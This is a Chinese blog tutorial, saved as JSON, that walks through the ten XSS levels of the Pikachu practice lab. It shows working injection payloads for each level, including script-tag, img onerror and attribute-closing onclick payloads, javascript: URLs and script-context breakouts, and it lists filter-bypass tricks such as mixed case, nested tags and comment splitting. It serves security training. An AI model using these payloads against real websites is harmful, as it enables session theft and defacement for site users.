{"blogid": "121332430", "writerAge": "码龄2年", "writerBlogNum": "12", "writerCollect": "26", "writerComment": "0", "writerFan": "12", "writerGrade": "2级", "writerIntegral": "126", "writerName": "一杯冰美式~", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_121332430.jpg", "writerRankTotal": "212154", "writerRankWeekly": "241630", "writerThumb": "6", "writerVisitNum": "22865", "blog_read_count": "5110", "blog_time": "于 2021-11-18 21:45:49 发布", "blog_title": "pikachu之xss靶场详细通关教程", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#Less1xssget_9\">Less-1反射型xss(get)</a></li><li><a href=\"#Less2xsspost_25\">Less-2反射性xss(post)</a></li><li><a href=\"#Less3xss_27\">Less-3存储型xss</a></li><li><a href=\"#Less4DOMxss_41\">Less-4DOM型xss</a></li><li><a href=\"#Less5DOMxss_66\">Less-5DOM型xss</a></li><li><a href=\"#Less6xss_99\">Less-6xss盲打</a></li><li><a href=\"#Less7xss_110\">Less-7xss过滤</a></li><li><a href=\"#Less8xsshtmlspecialchars_153\">Less-8xss之htmlspecialchars</a></li><li><a href=\"#Less9xsshref_179\">Less-9xss之href输出</a></li><li><a href=\"#Less10xssjs_192\">Less-10xss之js输出</a></li></ul>\n</div>\n<p></p>\n<hr color=\"#000000\" size='1\"'/>\n<h1><a id=\"Less1xssget_9\"></a>Less-1反射型xss(get)</h1>\n<p>我们先输入一些特殊字符，看是否有过滤掉我们输入的特殊字符,点击提交如图所示</p>\n<pre><code>' '' &lt;&gt;6666\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6f7f2cc82b7d463db3ee83b561e8ad63.png\"/>此时发现并没有过滤掉特殊字符，可能存在xss漏洞，我们查看页面源码，右键点击空白处即可。<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2bb1b20e7e0c4c0080edb8b599e4c6ea.png\"/>然后按Ctrl+F输入6666即可找到对应输出的语句。<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\f746463b696240a2acda52ecde8e36e9.png\"/>然后我们输入</p>\n<pre><code>&lt;script&gt;alert('xss')&lt;/script&gt;\n</code></pre>\n<p>此时发现输入文本框长度不够，我们可以进行修改前端代码尝试。按F12打开开发者工具，然后将20改为更大的数。<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\79ab34d49b6d4b7fb651f055540b5b9a.png\"/>然后输入点击提交即可</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\cdab407d016c4f8692af961d476964cb.png\"/></p>\n<h1><a id=\"Less2xsspost_25\"></a>Less-2反射性xss(post)</h1>\n<p>由暴力破解即可知道账号密码，登录然后跟less-1一样输入即可，GET和POST的区别是GET是以url方式提交数据而POST是以表单方式在请求体里面提交即在上一个实验中，可以通过URL来改变参数利用xss漏洞，而在这个实验中不可以。</p>\n<h1><a id=\"Less3xss_27\"></a>Less-3存储型xss</h1>\n<p>首先我们尝试输入一些特殊字符</p>\n<pre><code>\" ' &lt;&gt; 666&amp;\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8eccec61f43c43f7bc7480b012f59015.png\"/><br/> 可以发现并没有过滤，然后我们跟前面步骤一样，输入代码提交后即可</p>\n<pre><code>&lt;script&gt;alert('xss')&lt;/script&gt;\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\622fddb44ca44da6b0c00bab037dc71a.png\"/></p>\n<p>与前两个实验不同的是，这个为存储型XSS之前为一次性的反射型XSS，这个写进了数据库与之前相比，这个会造成一个持久性伤害每次打开页面弹窗都会出现。</p>\n<h1><a id=\"Less4DOMxss_41\"></a>Less-4DOM型xss</h1>\n<p>我们先输入111查看<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1f92d42805e6483f8c6c45619d3517cc.png\"/>发现出来what do you see，点击发现页面404，我们查看源码，找到what do you see</p>\n<div class=\"page-content\">\n<pre><code>        &lt;div id=\"xssd_main\"&gt;\n            &lt;script&gt;\n                function domxss(){\n                    var str = document.getElementById(\"text\").value;\n                    document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+str+\"'&gt;what do you see?&lt;/a&gt;\";\n                }\n                //试试：'&gt;&lt;img src=\"#\" onmouseover=\"alert('xss')\"&gt;\n                //试试：' onclick=\"alert('xss')\"&gt;,闭合掉就行\n            &lt;/script&gt;\n            &lt;!--&lt;a href=\"\" onclick=('xss')&gt;--&gt;\n            &lt;input id=\"text\" name=\"text\" type=\"text\"  value=\"\" /&gt;\n            &lt;input id=\"button\" type=\"button\" value=\"click me!\" onclick=\"domxss()\" /&gt;\n            &lt;div id=\"dom\"&gt;&lt;/div&gt;\n        &lt;/div&gt;\n</code></pre>\n</div>\n<p>点击提交按钮时会触发onclick事件，执行domxss()函数，通过document.getElementById()函数获取输入框内内容显示到页面<br/> 只要将 &lt; a href=\"’ \"&gt; &lt; /a &gt;标签造成闭合即可通关，我们输入</p>\n<pre><code>#' onclick=\"alert(111)\"&gt;\n</code></pre>\n<p>点击提交即可<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\50a7ad1e03bb4cc880943b9b536bdcba.png\"/></p>\n<h1><a id=\"Less5DOMxss_66\"></a>Less-5DOM型xss</h1>\n<p>我们先输入1111，点击提交<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\31be6724eccf40c3b9064f00c1286ffc.png\"/>我们查看页面源代码</p>\n<pre><code class=\"prism language-javascript\"><span class=\"token operator\">&lt;</span>div id<span class=\"token operator\">=</span><span class=\"token string\">\"xssd_main\"</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>script<span class=\"token operator\">&gt;</span>\n                    <span class=\"token keyword\">function</span> <span class=\"token function\">domxss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                        <span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">var</span> txss <span class=\"token operator\">=</span> <span class=\"token function\">decodeURIComponent</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"text=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">var</span> xss <span class=\"token operator\">=</span> txss<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">\\+</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//                        alert(xss);</span>\n\n                        document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dom\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;a href='\"</span><span class=\"token operator\">+</span>xss<span class=\"token operator\">+</span><span class=\"token string\">\"'&gt;就让往事都随风,都随风吧&lt;/a&gt;\"</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                    <span class=\"token comment\">//试试：'&gt;&lt;img src=\"#\" οnmοuseοver=\"alert('xss')\"&gt;</span>\n                    <span class=\"token comment\">//试试：' οnclick=\"alert('xss')\"&gt;,闭合掉就行</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span> onclick<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>form method<span class=\"token operator\">=</span><span class=\"token string\">\"get\"</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>input id<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span> type<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span>  value<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>input id<span class=\"token operator\">=</span><span class=\"token string\">\"submit\"</span> type<span class=\"token operator\">=</span><span class=\"token string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string\">\"请说出你的伤心往事\"</span><span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>div id<span class=\"token operator\">=</span><span class=\"token string\">\"dom\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n\n            <span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">'#'</span> onclick<span class=\"token operator\">=</span><span class=\"token string\">'domxss()'</span><span class=\"token operator\">&gt;</span>有些费尽心机想要忘记的事情<span class=\"token punctuation\">,</span>后来真的就忘掉了<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>我们通过读代码可以发现，这个也是从url读取我们的输入的内容，跟反射型一样，它的输出也是在a标签里面，我们输入</p>\n<pre><code>#' onclick=\"alert(111)\"&gt;\n</code></pre>\n<p>然后点击就让往事随风吧即可弹窗<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\201d1cfebf7f4cb6b277ba9a252f5faa.png\"/></p>\n<h1><a id=\"Less6xss_99\"></a>Less-6xss盲打</h1>\n<p>两个空随便输入111，点击提交，可以看到<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a623ac0a678440bbac09b7e8c7822244.png\"/><br/> 看起来我们输入的内容像是被提交给了后台， 我们尝试输入语句</p>\n<pre><code>&lt;script&gt;alert('xss')&lt;/script&gt;\n</code></pre>\n<p>点击提交，然后登录后台，管理员界面。<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e0d6ddf208ea4a3c8d206e79288c40c2.png\"/><br/> 点击提示可查看登陆界面<br/> 登陆后即可发现弹框<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\af35a2fbdbc145d685079d6d073e9148.png\"/></p>\n<h1><a id=\"Less7xss_110\"></a>Less-7xss过滤</h1>\n<p>补充知识：<br/> xss绕过-过滤<br/> 1.前端限制绕过，直接抓包重放，或者修改html前端代码<br/> 2.大小写，比如:</p>\n<pre><code>&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;\n</code></pre>\n<p>3.拼凑:</p>\n<pre><code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt; pt&gt;\n</code></pre>\n<p>4.使用注释进行干扰:</p>\n<pre><code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc &lt;!--test--&gt; ript&gt;\n</code></pre>\n<p>xss-绕过-编码<br/> 后台过滤了特殊字符,比如script标签,但该标签可以被各种编码,后台不一定会过滤，当浏览器对该编码进行识别时,会翻译成正常的标签,从而执行.<br/> 例如：<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ff300652e34f49cebb3c3af0099e7f3a.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6779243d4b274048830e15121c5968c3.png\"/><br/> 我们开始通关，首先输入</p>\n<pre><code>&lt;script&gt;;' \"123\n</code></pre>\n<p>点击提交进行尝试，<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\97540a8f931a47daa2d5e438433df6bc.png\"/><br/> 查看页面源代码，发现script标签被过滤掉了</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\fd31b0b5d8d24a05ac706b9d579dd74e.png\"/></p>\n<p>接下来我们尝试大小写混合的方式来进行注入,成功弹窗。</p>\n<pre><code>&lt;ScRipT&gt;alert('xss')&lt;/ScRipT&gt;\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2875e91418ca46e9bb809b39b9e3ec1f.png\"/><br/> 同样，我们还可以使用img标签，输入</p>\n<pre><code>&lt;img src=x onerror=\"alert(111)\"/&gt; \n</code></pre>\n<p>也可以弹框<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a5d244bf499e42f2a98cb21e9ea1b9a0.png\"/></p>\n<h1><a id=\"Less8xsshtmlspecialchars_153\"></a>Less-8xss之htmlspecialchars</h1>\n<p>首先，大家要了解htmlspecialchars()函数是php常用方法，是把预定义的字符转换为HTML实体。预定义的字符是:</p>\n<pre><code>&amp;（和号）成为&amp;amp\n”(双引号）成为&amp;quot\n′(单引号)成为&amp;#039\n&lt;(小于)成为&amp;lt\n&gt;(大于）成为&amp;gt\n可用的引号类型:\nENT_COMPAT -默认。仅编码双引号。\nENT_QUOTES-编码双引号和单引号。\nENT_NOQUOTES-不编码任何引号。\n</code></pre>\n<p>我们先输入</p>\n<pre><code>111' \" &lt;&gt;&amp;\n</code></pre>\n<p>查看页面源代码，发现单引号没有被过滤<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\89e24b372eb64e3384880a86c0fbed66.png\"/><br/> 我们输入</p>\n<pre><code>1' onclick='alert(111)'\n</code></pre>\n<p>点击提交，再点击文本框下方的输入语句，即可弹框<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\22b9b2003f0e424092b3de5e43a64309.png\"/></p>\n<h1><a id=\"Less9xsshref_179\"></a>Less-9xss之href输出</h1>\n<p>输出在a标签的herf属性里面，可以使用javascript协议来执行js<br/> 防御的时候只允许http或者https，其次在处理htmlspecialchars()函数。<br/> 我们打开本地这一关卡的php文件查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a1dc089a89624e96b28b0cf51832de12.png\"/><br/> 我们可以发现它把字符包括单引号双引号，左右尖括号都过滤了<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\86fb65070762445fb1a5dfe214608a46.png\"/><br/> 我们尝试输入</p>\n<pre><code>javascript:alert(111)\n</code></pre>\n<p>然后点击提交，点击下面的篮字即可弹窗<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\930f0e6cad8a4b4182372b6ac7b41abc.png\"/></p>\n<h1><a id=\"Less10xssjs_192\"></a>Less-10xss之js输出</h1>\n<p>首先，我们输入1111，查看页面源代码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\62d53f421d3046c5887ae2f5c182333e.png\"/><br/> 然后我们可以构造<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e77f10aca679476b9d3ee4f6d46c50ba.png\"/><br/> 对应颜色的做闭合<br/> 所以我们输入</p>\n<pre><code>x'&lt;/script&gt;&lt;script&gt;alert('xss')&lt;/script&gt;\n</code></pre>\n<p>即可弹窗<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c38135251fc740cbac34f04c83bf8456.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 1, "java": 0, "sql": 0, "php": 1, "time": "2021-11-18 21:45:49", "summary": "文章目录反射型反射性存储型型型盲打过滤之之输出之输出反射型我们先输入一些特殊字符，看是否有过滤掉我们输入的特殊字符点击提交如图所示在这里插入图片描述此时发现并没有过滤掉特殊字符，可能存在漏洞，我们查看"}